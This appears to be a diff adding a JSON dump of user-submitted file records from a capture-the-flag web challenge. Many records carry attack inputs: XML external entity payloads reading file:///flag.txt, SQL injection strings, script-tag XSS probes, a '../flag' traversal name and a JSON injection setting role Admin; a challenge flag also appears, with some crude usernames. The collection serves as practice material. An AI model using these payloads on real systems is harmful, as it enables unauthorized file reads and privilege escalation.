@@ -1,0 +1,360 @@
+{
+  "author": "test12", 
+  "content": "<!DOCTYPE a [<!ENTITY f SYSTEM \"file:///flag.txt\">\n]>\n<a>&f;</a>", 
+  "id": 202, 
+  "name": "xml"
+},
+{
+  "author": "test12", 
+  "content": "<!DOCTYPE a [<!ENTITY f SYSTEM \"file:///flag.txt\">]>\n<a>&f;</a>", 
+  "id": 203, 
+  "name": "xml2"
+},
+{
+  "author": "test12", 
+  "content": "<!DOCTYPE a [\n<!ENTITY f SYSTEM \"file:///flag.txt\">]>\n<a>&f;</a>", 
+  "id": 204, 
+  "name": "xml3"
+},
+{
+  "author": "hello2", 
+  "content": "sample text", 
+  "id": 210, 
+  "name": "flag.txt"
+},
+{
+  "author": "gej3", 
+  "content": "&test;", 
+  "id": 211, 
+  "name": "<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag.txt'>]>"
+},
+{
+  "author": "hihi", 
+  "content": "break2{1 ' or 1 = 1 --", 
+  "id": 217, 
+  "name": "sql"
+},
+{
+  "author": "<script>alert(1);</script>", 
+  "content": "<script>alert(flag)</script>", 
+  "id": 221, 
+  "name": "new_file"
+},
+{
+  "author": "<script>alert(1);</script>", 
+  "content": "<script>alert(document.flag)</script>", 
+  "id": 223, 
+  "name": "new_file3"
+},
+{
+  "author": "kebab", 
+  "content": "sample text", 
+  "id": 277, 
+  "name": "staff_api_a456h7dvra"
+},
+{
+  "author": "flag", 
+  "content": "BREAK2{9gh978g-g8ggio082q-adw-2dfw}", 
+  "id": 280, 
+  "name": "Congrats!!!"
+},
+{
+  "author": "lachyislife", 
+  "content": "sample texawdawdawt", 
+  "id": 281, 
+  "name": "<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag.txt'>]>"
+},
+{
+  "author": "test11", 
+  "content": "not actually", 
+  "id": 285, 
+  "name": "flag"
+},
+{
+  "author": "meow", 
+  "content": "sample text", 
+  "id": 288, 
+  "name": "' UNION SELECT 'Admin','a'"
+},
+{
+  "author": "meow", 
+  "content": "' UNION SELECT 'Admin','a'", 
+  "id": 289, 
+  "name": "a"
+},
+{
+  "author": "flag", 
+  "content": "sample text", 
+  "id": 292, 
+  "name": "new_file"
+},
+{
+  "author": "flag", 
+  "content": "lol", 
+  "id": 293, 
+  "name": "lol"
+},
+{
+  "author": "flag", 
+  "content": "a'a", 
+  "id": 294, 
+  "name": "a'a"
+},
+{
+  "author": "flag", 
+  "content": "3", 
+  "id": 295, 
+  "name": "3"
+},
+{
+  "author": "flag", 
+  "content": "aa", 
+  "id": 296, 
+  "name": "aa"
+},
+{
+  "author": "adminadmin", 
+  "content": "lorem ipsum", 
+  "id": 299, 
+  "name": "file name"
+},
+{
+  "author": "adminadmin", 
+  "content": "'", 
+  "id": 300, 
+  "name": "'"
+},
+{
+  "author": "adminadmin", 
+  "content": "1' OR '1'='1", 
+  "id": 303, 
+  "name": "1' OR '1'='1"
+},
+{
+  "author": "asdf", 
+  "content": "\\[\\<!ENTITY test SYSTEM 'file:///flag.txt'>\\]", 
+  "id": 311, 
+  "name": "new_file"
+},
+{
+  "author": "new1", 
+  "content": "\"[<!ENTITY test SYSTEM 'file:///flag.txt'>]>\\n<p>&test;</p>\"", 
+  "id": 349, 
+  "name": "new_file"
+},
+{
+  "author": "new1", 
+  "content": "\\[\\<!ENTITY test SYSTEM 'file:///flag.txt'>\\]\n\n<p>&test;</p>", 
+  "id": 350, 
+  "name": "a"
+},
+{
+  "author": "new1", 
+  "content": "<!ENTITY bar SYSTEM \"file:///flag.txt\">;<foo>&bar;</foo>", 
+  "id": 352, 
+  "name": "c"
+},
+{
+  "author": "new1", 
+  "content": "<script>alert(flag)</script>", 
+  "id": 353, 
+  "name": "d"
+},
+{
+  "author": "adminadmin", 
+  "content": "<script>alert('WOW')<script>", 
+  "id": 357, 
+  "name": "<script>alert('WOW')<script>"
+},
+{
+  "author": "adminadmin", 
+  "content": "sample text", 
+  "id": 358, 
+  "name": "new_file"
+},
+{
+  "author": "hellohacker2", 
+  "content": "sample text", 
+  "id": 359, 
+  "name": "<!DOCTYPE a [<!ENTITY f SYSTEM \"file:///flag.txt\"> ]> <a>&f;</a>"
+},
+{
+  "author": "hellohacker2", 
+  "content": "flags.txt", 
+  "id": 360, 
+  "name": "flags.txt"
+},
+{
+  "author": "test1", 
+  "content": "<script>alert(flag);</script>", 
+  "id": 368, 
+  "name": "b"
+},
+{
+  "author": "hellohacker3", 
+  "content": "<!DOCTYPE a [<!ENTITY f SYSTEM \"file:///flag.txt\"> ]> <a>&f;</a>", 
+  "id": 369, 
+  "name": "hello"
+},
+{
+  "author": "ehehe", 
+  "content": "<!ENTITY file SYSTEM 'file:///flag'>", 
+  "id": 374, 
+  "name": "tell me it isn't"
+},
+{
+  "author": "ehehe", 
+  "content": "<!ENTITY file SYSTEM 'file:///flag'>\n%file;", 
+  "id": 375, 
+  "name": "1"
+},
+{
+  "author": "aaa", 
+  "content": "<!ENTITY file SYSTEM 'file:///flag'>\n&file;", 
+  "id": 376, 
+  "name": "a"
+},
+{
+  "author": "admin ", 
+  "content": "hello world", 
+  "id": 379, 
+  "name": "123"
+},
+{
+  "author": "admin ", 
+  "content": "hello world234", 
+  "id": 380, 
+  "name": "hello_world123"
+},
+{
+  "author": "hug1", 
+  "content": "sample text", 
+  "id": 382, 
+  "name": "../flag"
+},
+{
+  "author": "asd", 
+  "content": "sample text", 
+  "id": 393, 
+  "name": "flagd"
+},
+{
+  "author": "tim123", 
+  "content": "sample text", 
+  "id": 400, 
+  "name": "flag"
+},
+{
+  "author": "tim123", 
+  "content": "' union select * from flag;--", 
+  "id": 401, 
+  "name": "xyz"
+},
+{
+  "author": "tim123", 
+  "content": "\" union select * from flag; --", 
+  "id": 402, 
+  "name": "abc"
+},
+{
+  "author": "admin", 
+  "content": "'", 
+  "id": 413, 
+  "name": "new_file"
+},
+{
+  "author": "admin", 
+  "content": "'", 
+  "id": 414, 
+  "name": "fuck"
+},
+{
+  "author": "Admin", 
+  "content": "FML", 
+  "id": 415, 
+  "name": "I got all this way for flags id already found :'("
+},
+{
+  "author": "lolno", 
+  "content": "admin\n", 
+  "id": 430, 
+  "name": "okie_new_file_then"
+},
+{
+  "author": "lolno", 
+  "content": "admin\n", 
+  "id": 431, 
+  "name": "okie_new_file_then_srlu"
+},
+{
+  "author": "user1", 
+  "content": "<!ENTITY xxe SYSTEM \\\"file:///flag.txt\\\"><a>\\\\&xxe;</a>", 
+  "id": 441, 
+  "name": "new_file3"
+},
+{
+  "author": "z5164514", 
+  "content": "its a mystery", 
+  "id": 456, 
+  "name": "staff_api_a456h7dvra"
+},
+{
+  "author": "c7", 
+  "content": "<script>alert(flag);</script>", 
+  "id": 472, 
+  "name": "new_file"
+},
+{
+  "author": "yelin", 
+  "content": "sample text", 
+  "id": 488, 
+  "name": "flag"
+},
+{
+  "author": "sadmin", 
+  "content": "asdasd", 
+  "id": 533, 
+  "name": "new_file"
+},
+{
+  "author": "Staff_account", 
+  "content": ":)", 
+  "id": 554, 
+  "name": "hello there"
+},
+{
+  "author": "coolman", 
+  "content": "lol\"}], \"role\": \"Admin\",\"username\": \"coolman\"} /*", 
+  "id": 582, 
+  "name": "asdasd"
+},
+{
+  "author": "coolman", 
+  "content": "pls work", 
+  "id": 583, 
+  "name": "lol\"}], \"role\": \"Admin\",\"username\": \"coolman\"} /*"
+},
+{
+  "author": "gayfuck", 
+  "content": "<script>role = \"Staff\"</script>", 
+  "id": 596, 
+  "name": "new_fileaaa"
+},
+{
+  "author": "careyeeee", 
+  "content": "sample text", 
+  "id": 608, 
+  "name": "flag"
+},
+{
+  "author": "careyeeee", 
+  "content": "sample text", 
+  "id": 609, 
+  "name": "flag.txt"
+},
+{
+  "author": "adsf", 
+  "content": "<!ENTITY bar SYSTEM \"file:///flag.txt\">;<foo>&bar;</foo>", 
+  "id": 638, 
+  "name": "test"
+}
